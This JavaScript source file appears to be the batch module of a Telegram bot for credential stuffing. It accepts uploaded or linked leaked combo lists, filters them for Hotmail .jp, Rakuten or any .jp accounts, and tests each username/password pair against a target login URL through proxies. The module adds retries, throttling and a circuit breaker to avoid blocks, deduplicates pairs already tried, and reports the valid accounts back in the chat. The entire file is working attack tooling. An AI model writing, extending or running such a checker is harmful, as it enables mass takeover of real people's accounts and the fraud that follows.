const { Markup } = require('telegraf');
const {
  prepareBatchFromFile,
  prepareAllBatch,
  prepareJpBatch,
  prepareUlpBatch,
  ALLOWED_DOMAINS,
  MAX_BYTES_HOTMAIL,
  MAX_BYTES_ULP,
} = require('../automation/batchProcessor');
const {
  DEFAULT_TTL_MS,
  initProcessedStore,
  getProcessedStatus,
  markProcessedStatus,
  isSkippableStatus,
  makeKey,
} = require('../automation/batch/processedStore');
const {
  escapeV2,
  formatBytes,
  formatDurationMs,
  buildFileTooLarge,
  buildFileReceived,
  buildUnableToLink,
  buildUlpProcessing,
  buildUlpParsed,
  buildUlpFileParsed,
  buildHotmailParsed,
  buildNoEligible,
  buildAllProcessed,
  buildBatchParseFailed,
  buildBatchConfirmStart,
  buildBatchProgress,
  buildBatchSummary,
  buildBatchAborted,
  buildBatchCancelled,
  buildBatchAborting,
  buildNoActiveBatch,
  buildBatchFailed,
  buildProcessingHotmail,
  codeSpan,
} = require('./messages');
const { createLogger } = require('../logger');

const log = createLogger('batch');

// Batch processing configuration
const BATCH_CONCURRENCY = Math.max(1, parseInt(process.env.BATCH_CONCURRENCY, 10) || 1); // default 1 for stability
const MAX_RETRIES = parseInt(process.env.BATCH_MAX_RETRIES, 10) || 1; // reduced retries
const REQUEST_DELAY_MS = parseInt(process.env.BATCH_DELAY_MS, 10) || 500; // delay between requests
const PROGRESS_UPDATE_INTERVAL_MS = 2000; // update every 2s
const ERROR_THRESHOLD_PERCENT = 60; // pause if error rate exceeds this
const ERROR_WINDOW_SIZE = 5; // check last N results for error rate
const CIRCUIT_BREAKER_PAUSE_MS = 3000; // pause when circuit breaker triggers

const TELEGRAM_FILE_LIMIT_BYTES = 20 * 1024 * 1024;
const pendingBatches = new Map();
const pendingFiles = new Map();
const PROCESSED_TTL_MS = parseInt(process.env.PROCESSED_TTL_MS, 10) || DEFAULT_TTL_MS;

async function filterAlreadyProcessed(creds) {
  await initProcessedStore(PROCESSED_TTL_MS);
  const filtered = [];
  let skipped = 0;

  for (const cred of creds) {
    const key = makeKey(cred.username, cred.password);
    const status = getProcessedStatus(key, PROCESSED_TTL_MS);
    if (status && isSkippableStatus(status)) {
      skipped += 1;
      continue;
    }
    filtered.push({ ...cred, _dedupeKey: key });
  }

  return { filtered, skipped };
}

function runBatchExecution(ctx, batch, msgId, statusMsg, options, helpers, key, checkCredentials) {
  const { escapeV2, formatDurationMs } = helpers;
  const chatId = ctx.chat.id;
  const counts = { VALID: 0, INVALID: 0, BLOCKED: 0, ERROR: 0 };
  let processed = 0;
  const validCreds = [];
  const startedAt = Date.now();
  let lastProgressAt = startedAt;
  
  // Circuit breaker state
  const recentResults = []; // sliding window of recent results
  let circuitBreakerTripped = false;
  let consecutiveErrors = 0;

  log.info(`[batch] executing file=${batch.filename} total=${batch.count} concurrency=${BATCH_CONCURRENCY}`);

  const iterator = batch.creds[Symbol.iterator]();

  // Progress update - blocking to ensure message gets updated
  const updateProgress = async (force = false) => {
    if (batch.aborted) return;
    
    const now = Date.now();
    if (!force && now - lastProgressAt < PROGRESS_UPDATE_INTERVAL_MS) return;
    
    lastProgressAt = now;
    
    const text = buildBatchProgress({
      filename: batch.filename,
      processed,
      total: batch.count,
      counts,
    });

    try {
      await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, text, {
        parse_mode: 'MarkdownV2',
      });
    } catch (err) {
      // Only log if not a "message not modified" error
      if (!err.message?.includes('message is not modified')) {
        log.debug(`Progress update failed: ${err.message}`);
      }
    }
  };

  // Check if we should pause due to high error rate
  const checkCircuitBreaker = () => {
    if (recentResults.length < ERROR_WINDOW_SIZE) return false;
    
    const errorCount = recentResults.filter(r => r === 'ERROR').length;
    const errorRate = (errorCount / recentResults.length) * 100;
    
    if (errorRate >= ERROR_THRESHOLD_PERCENT) {
      if (!circuitBreakerTripped) {
        circuitBreakerTripped = true;
        log.warn(`[batch] Circuit breaker: ${errorRate.toFixed(0)}% errors in last ${ERROR_WINDOW_SIZE} - pausing ${CIRCUIT_BREAKER_PAUSE_MS}ms`);
      }
      return true;
    }
    
    circuitBreakerTripped = false;
    return false;
  };

  const processCredential = async (cred) => {
    if (batch.aborted) return;
    
    // Check circuit breaker before processing
    if (checkCircuitBreaker()) {
      await new Promise(r => setTimeout(r, CIRCUIT_BREAKER_PAUSE_MS));
      recentResults.length = 0; // reset window after pause
      consecutiveErrors = 0;
    }
    
    let result;
    const credKey = cred._dedupeKey || makeKey(cred.username, cred.password);
    
    // Retry loop for ERROR results
    for (let attempt = 0; attempt <= MAX_RETRIES; attempt++) {
      if (batch.aborted) return;
      
      try {
        result = await checkCredentials(cred.username, cred.password, {
          timeoutMs: options.timeoutMs || 60000,
          proxy: options.proxy,
          targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
        });
      } catch (err) {
        result = { status: 'ERROR', message: err.message };
      }
      
      // Only retry on ERROR
      if (result.status !== 'ERROR' || attempt >= MAX_RETRIES) break;
      
      log.debug(`[batch] Retry ${cred.username} (${attempt + 2}/${MAX_RETRIES + 1}): ${result.message}`);
      // Exponential backoff: 500ms, 1000ms, 2000ms...
      await new Promise(r => setTimeout(r, (500 * Math.pow(2, attempt)) + Math.random() * 300));
    }

    // Track for circuit breaker
    recentResults.push(result.status);
    if (recentResults.length > ERROR_WINDOW_SIZE) recentResults.shift();
    
    // Track consecutive errors
    if (result.status === 'ERROR') {
      consecutiveErrors++;
    } else {
      consecutiveErrors = 0;
    }

    counts[result.status] = (counts[result.status] || 0) + 1;
    processed += 1;

    if (result.status === 'VALID') {
      validCreds.push({ username: cred.username, password: cred.password });
    }

    // Non-blocking cache update
    markProcessedStatus(credKey, result.status, PROCESSED_TTL_MS).catch(() => {});
    
    return result;
  };

  // Process credentials in chunks - wait for entire chunk to complete before next
  const processInChunks = async () => {
    const allCreds = batch.creds;
    const chunkSize = BATCH_CONCURRENCY;
    
    for (let i = 0; i < allCreds.length; i += chunkSize) {
      if (batch.aborted) break;
      
      // Check circuit breaker before each chunk
      if (checkCircuitBreaker()) {
        await new Promise(r => setTimeout(r, CIRCUIT_BREAKER_PAUSE_MS));
        recentResults.length = 0;
      }
      
      const chunk = allCreds.slice(i, i + chunkSize);
      const chunkNum = Math.floor(i / chunkSize) + 1;
      const totalChunks = Math.ceil(allCreds.length / chunkSize);
      
      log.debug(`[batch] Processing chunk ${chunkNum}/${totalChunks} (${chunk.length} credentials)`);
      
      // Process credentials - sequentially if concurrency is 1, parallel otherwise
      if (chunkSize === 1) {
        await processCredential(chunk[0]);
      } else {
        await Promise.all(chunk.map(cred => processCredential(cred)));
      }
      
      // Update progress after each chunk completes (blocking)
      await updateProgress(true);
      
      // Delay between chunks to avoid overwhelming the server
      if (i + chunkSize < allCreds.length && REQUEST_DELAY_MS > 0) {
        await new Promise(r => setTimeout(r, REQUEST_DELAY_MS));
      }
    }
  };

  const execute = async () => {
    try {
      await processInChunks();

      const elapsed = Date.now() - startedAt;
      const summary = batch.aborted
        ? buildBatchAborted({ filename: batch.filename, total: batch.count, processed })
        : buildBatchSummary({
            filename: batch.filename,
            total: batch.count,
            skipped: batch.skipped || 0,
            counts,
            elapsedMs: elapsed,
            validCreds,
          });

      try {
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, summary, {
          parse_mode: 'MarkdownV2',
        });
      } catch (err) {
        log.warn('Batch summary edit failed:', err.message);
        await ctx.reply(summary, {
          parse_mode: 'MarkdownV2',
          reply_to_message_id: Number(msgId),
        });
      }

      log.info(
        `[batch] finished file=${batch.filename} aborted=${!!batch.aborted} processed=${processed}/${batch.count} ` +
          `valid=${counts.VALID} invalid=${counts.INVALID} blocked=${counts.BLOCKED} error=${counts.ERROR} elapsed_ms=${elapsed}`
      );
    } catch (err) {
      try {
        await ctx.reply(buildBatchFailed(err.message), {
          parse_mode: 'MarkdownV2',
          reply_to_message_id: Number(msgId),
        });
      } catch (_) {
        // swallow
      }
      log.warn('Batch execution error:', err.message);
      log.warn(`[batch] execution failed file=${batch.filename} msg=${err.message}`);
    } finally {
      pendingBatches.delete(key);
    }
  };

  // Schedule to avoid Telegraf 90s per-update timeout
  setTimeout(execute, 0);
}

function registerBatchHandlers(bot, options, helpers) {
  const checkCredentials = options.checkCredentials;

  if (typeof checkCredentials !== 'function') {
    throw new Error('registerBatchHandlers requires options.checkCredentials');
  }

  bot.on('document', async (ctx) => {
    const doc = ctx.message && ctx.message.document;
    if (!doc) return;

    const chatId = ctx.chat.id;
    const sourceMessageId = ctx.message && ctx.message.message_id;

    log.info(`[batch] file received name=${doc.file_name || 'unknown'} size=${doc.file_size || 0}`);

    if (doc.file_size && doc.file_size > TELEGRAM_FILE_LIMIT_BYTES) {
      await ctx.reply(buildFileTooLarge(), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: sourceMessageId,
      });
      return;
    }

    let fileUrl;
    try {
      const link = await ctx.telegram.getFileLink(doc.file_id);
      fileUrl = link.href || link.toString();
    } catch (err) {
      await ctx.reply(buildUnableToLink(err.message), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: doc.message_id,
      });
      return;
    }

    const key = `${chatId}:${sourceMessageId}`;
    pendingFiles.set(key, {
      fileUrl,
      filename: doc.file_name || 'file.txt',
      size: doc.file_size,
      sourceMessageId,
    });

    await ctx.reply(buildFileReceived({ filename: doc.file_name || 'file', size: doc.file_size }), {
      parse_mode: 'MarkdownV2',
      reply_to_message_id: sourceMessageId,
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback('📧 HOTMAIL (.jp)', `batch_type_hotmail_${sourceMessageId}`),
          Markup.button.callback('📄 ULP (Rakuten)', `batch_type_ulp_${sourceMessageId}`),
        ],
        [
          Markup.button.callback('🇯🇵 JP Domains', `batch_type_jp_${sourceMessageId}`),
          Markup.button.callback('📋 ALL', `batch_type_all_${sourceMessageId}`),
        ],
        [Markup.button.callback('⛔ Cancel', `batch_cancel_${sourceMessageId}`)],
      ]),
    });
  });

  bot.hears(/^\.ulp\s+(https?:\/\/\S+)/i, async (ctx) => {
    const chatId = ctx.chat.id;
    const sourceMessageId = ctx.message && ctx.message.message_id;
    const url = ctx.match[1];

    log.info(`[batch][ulp] start url=${url}`);

    if (!url || url.length > 1000) {
      await ctx.reply(escapeV2('⚠️ Provide a valid URL after `.ulp`.'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: sourceMessageId,
      });
      return;
    }

    try {
      await ctx.reply(buildUlpProcessing(), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: sourceMessageId,
      });
    } catch (_) {}

    let batch;
    try {
      batch = await prepareUlpBatch(url, MAX_BYTES_ULP);
      log.info(`[batch][ulp] parsed count=${batch.count}`);
    } catch (err) {
      await ctx.reply(buildBatchParseFailed(err.message), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: sourceMessageId,
      });
      log.warn(`[batch][ulp] parse failed url=${url} msg=${err.message}`);
      return;
    }

    if (!batch.count) {
      await ctx.reply(buildNoEligible('Rakuten'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: sourceMessageId,
      });
      return;
    }

    const { filtered, skipped } = await filterAlreadyProcessed(batch.creds);
    if (!filtered.length) {
      await ctx.reply(buildAllProcessed('from this URL'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: sourceMessageId,
      });
      return;
    }

    batch.creds = filtered;
    batch.count = filtered.length;
    batch.skipped = skipped;

    const key = `${chatId}:${sourceMessageId}`;
    pendingBatches.set(key, {
      creds: batch.creds,
      filename: url,
      count: batch.count,
      skipped: batch.skipped,
      sourceMessageId: Number(sourceMessageId),
    });

    await ctx.reply(buildUlpParsed({ url, count: batch.count }), {
      parse_mode: 'MarkdownV2',
      reply_to_message_id: sourceMessageId,
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback('✅ Proceed', `batch_confirm_${sourceMessageId}`),
          Markup.button.callback('⛔ Cancel', `batch_cancel_${sourceMessageId}`),
        ],
      ]),
    });
  });

  bot.action(/batch_confirm_(.+)/, async (ctx) => {
    try {
      await ctx.answerCbQuery();
      const msgId = ctx.match[1];
      const key = `${ctx.chat.id}:${msgId}`;
      const batch = pendingBatches.get(key);
      if (!batch) {
        await ctx.reply(buildBatchFailed('Batch expired. Send the file again to restart.'), {
          parse_mode: 'MarkdownV2',
          reply_to_message_id: Number(msgId),
        });
        return;
      }

      const statusText = buildBatchConfirmStart({
        filename: batch.filename,
        count: batch.count,
        skipped: batch.skipped,
      });

      const statusMsg = await ctx.reply(statusText, {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
        ...Markup.inlineKeyboard([[Markup.button.callback('⏹ Abort', `batch_abort_${msgId}`)]]),
      });

      log.info(`[batch] starting file=${batch.filename} count=${batch.count}`);

      runBatchExecution(ctx, batch, msgId, statusMsg, options, helpers, key, checkCredentials);
    } catch (err) {
      log.warn('Batch confirm handler error:', err.message);
      await ctx.reply(buildBatchFailed(err.message), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: ctx.update?.callback_query?.message?.message_id,
      });
    }
  });

  bot.action(/batch_cancel_(.+)/, async (ctx) => {
    await ctx.answerCbQuery('Batch cancelled');
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    pendingBatches.delete(key);
    pendingFiles.delete(key);
    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        ctx.update.callback_query.message.message_id,
        undefined,
        buildBatchCancelled(),
        { parse_mode: 'MarkdownV2' }
      );
    } catch (_) {
      await ctx.reply(buildBatchCancelled(), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
    }
  });

  bot.action(/batch_type_hotmail_(.+)/, async (ctx) => {
    await ctx.answerCbQuery();
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    const file = pendingFiles.get(key);
    if (!file) {
      await ctx.reply(buildBatchFailed('File info expired. Send the file again.'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        ctx.update.callback_query.message.message_id,
        undefined,
        buildProcessingHotmail(),
        { parse_mode: 'MarkdownV2' }
      );
    } catch (_) {}

    let batch;
    try {
      batch = await prepareBatchFromFile(file.fileUrl, MAX_BYTES_HOTMAIL);
      log.info(`[batch][hotmail] parsed count=${batch.count} file=${file.filename}`);
    } catch (err) {
      await ctx.reply(buildBatchParseFailed(err.message), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      log.warn(`[batch][hotmail] parse failed file=${file.filename} msg=${err.message}`);
      return;
    }

    if (!batch.count) {
      await ctx.reply(buildNoEligible('Microsoft .jp'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    const { filtered, skipped } = await filterAlreadyProcessed(batch.creds);
    if (!filtered.length) {
      await ctx.reply(buildAllProcessed('in this file'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    batch.creds = filtered;
    batch.count = filtered.length;
    batch.skipped = skipped;

    pendingFiles.delete(key);
    pendingBatches.set(key, {
      creds: batch.creds,
      filename: file.filename,
      count: batch.count,
      skipped: batch.skipped,
      sourceMessageId: Number(msgId),
    });

    await ctx.reply(
      buildHotmailParsed({ filename: file.filename, size: file.size, count: batch.count, allowedDomains: ALLOWED_DOMAINS }),
      {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
            Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
          ],
        ]),
      }
    );
  });

  bot.action(/batch_type_ulp_(.+)/, async (ctx) => {
    await ctx.answerCbQuery();
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    const file = pendingFiles.get(key);
    if (!file) {
      await ctx.reply(buildBatchFailed('File info expired. Send the file again.'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        ctx.update.callback_query.message.message_id,
        undefined,
        buildProcessingUlp(),
        { parse_mode: 'MarkdownV2' }
      );
    } catch (_) {}

    let batch;
    try {
      batch = await prepareUlpBatch(file.fileUrl, MAX_BYTES_ULP);
      log.info(`[batch][ulp-file] parsed count=${batch.count} file=${file.filename}`);
    } catch (err) {
      await ctx.reply(buildBatchParseFailed(err.message), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      log.warn(`[batch][ulp-file] parse failed file=${file.filename} msg=${err.message}`);
      return;
    }

    if (!batch.count) {
      await ctx.reply(buildNoEligible('Rakuten'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    const { filtered, skipped } = await filterAlreadyProcessed(batch.creds);
    if (!filtered.length) {
      await ctx.reply(buildAllProcessed('in this file'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    batch.creds = filtered;
    batch.count = filtered.length;
    batch.skipped = skipped;

    pendingFiles.delete(key);
    pendingBatches.set(key, {
      creds: batch.creds,
      filename: file.filename,
      count: batch.count,
      skipped: batch.skipped,
      sourceMessageId: Number(msgId),
    });

    await ctx.reply(
      buildUlpFileParsed({ filename: file.filename, size: file.size, count: batch.count }),
      {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
            Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
          ],
        ]),
      }
    );
  });

  // ALL mode - no domain filtering
  bot.action(/batch_type_all_(.+)/, async (ctx) => {
    await ctx.answerCbQuery();
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    const file = pendingFiles.get(key);
    if (!file) {
      await ctx.reply(buildBatchFailed('File info expired. Send the file again.'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        ctx.update.callback_query.message.message_id,
        undefined,
        escapeV2('⏳ Parsing all credentials (no filter)...'),
        { parse_mode: 'MarkdownV2' }
      );
    } catch (_) {}

    let batch;
    try {
      batch = await prepareAllBatch(file.fileUrl, MAX_BYTES_HOTMAIL);
      log.info(`[batch][all] parsed count=${batch.count} file=${file.filename}`);
    } catch (err) {
      await ctx.reply(buildBatchParseFailed(err.message), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      log.warn(`[batch][all] parse failed file=${file.filename} msg=${err.message}`);
      return;
    }

    if (!batch.count) {
      await ctx.reply(escapeV2('⚠️ No valid credentials found in file.'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    const { filtered, skipped } = await filterAlreadyProcessed(batch.creds);
    if (!filtered.length) {
      await ctx.reply(buildAllProcessed('in this file'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    batch.creds = filtered;
    batch.count = filtered.length;
    batch.skipped = skipped;

    pendingFiles.delete(key);
    pendingBatches.set(key, {
      creds: batch.creds,
      filename: file.filename,
      count: batch.count,
      skipped: batch.skipped,
      sourceMessageId: Number(msgId),
    });

    const msg = escapeV2(`📋 ALL Mode (no filter)\n`) +
      escapeV2(`📄 File: `) + codeSpan(file.filename) + escapeV2(`\n`) +
      escapeV2(`📊 Found: ${batch.count} credentials\n`) +
      (batch.skipped ? escapeV2(`⏭️ Skipped: ${batch.skipped} (already processed)\n`) : '') +
      escapeV2(`\nReady to process?`);

    await ctx.reply(msg, {
      parse_mode: 'MarkdownV2',
      reply_to_message_id: Number(msgId),
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
          Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
        ],
      ]),
    });
  });

  // JP Domains mode - any .jp domain
  bot.action(/batch_type_jp_(.+)/, async (ctx) => {
    await ctx.answerCbQuery();
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    const file = pendingFiles.get(key);
    if (!file) {
      await ctx.reply(buildBatchFailed('File info expired. Send the file again.'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        ctx.update.callback_query.message.message_id,
        undefined,
        escapeV2('⏳ Parsing .jp domain credentials...'),
        { parse_mode: 'MarkdownV2' }
      );
    } catch (_) {}

    let batch;
    try {
      batch = await prepareJpBatch(file.fileUrl, MAX_BYTES_HOTMAIL);
      log.info(`[batch][jp] parsed count=${batch.count} file=${file.filename}`);
    } catch (err) {
      await ctx.reply(buildBatchParseFailed(err.message), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      log.warn(`[batch][jp] parse failed file=${file.filename} msg=${err.message}`);
      return;
    }

    if (!batch.count) {
      await ctx.reply(escapeV2('⚠️ No .jp domain credentials found in file.'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    const { filtered, skipped } = await filterAlreadyProcessed(batch.creds);
    if (!filtered.length) {
      await ctx.reply(buildAllProcessed('in this file'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    batch.creds = filtered;
    batch.count = filtered.length;
    batch.skipped = skipped;

    pendingFiles.delete(key);
    pendingBatches.set(key, {
      creds: batch.creds,
      filename: file.filename,
      count: batch.count,
      skipped: batch.skipped,
      sourceMessageId: Number(msgId),
    });

    const msg = escapeV2(`🇯🇵 JP Domains Mode\n`) +
      escapeV2(`📄 File: `) + codeSpan(file.filename) + escapeV2(`\n`) +
      escapeV2(`📊 Found: ${batch.count} credentials (*.jp)\n`) +
      (batch.skipped ? escapeV2(`⏭️ Skipped: ${batch.skipped} (already processed)\n`) : '') +
      escapeV2(`\nReady to process?`);

    await ctx.reply(msg, {
      parse_mode: 'MarkdownV2',
      reply_to_message_id: Number(msgId),
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
          Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
        ],
      ]),
    });
  });

  bot.action(/batch_abort_(.+)/, async (ctx) => {
    await ctx.answerCbQuery('Aborting...');
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    const batch = pendingBatches.get(key);
    if (batch) {
      batch.aborted = true;
      log.info(`[batch] abort requested file=${batch.filename}`);
      try {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          ctx.update.callback_query.message.message_id,
          undefined,
          buildBatchAborting(),
          {
            parse_mode: 'MarkdownV2',
            ...Markup.inlineKeyboard([]),
          }
        );
      } catch (_) {}
    } else {
      await ctx.reply(buildNoActiveBatch(), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: ctx.update.callback_query.message.message_id,
      });
    }
  });
}

module.exports = {
  registerBatchHandlers,
};
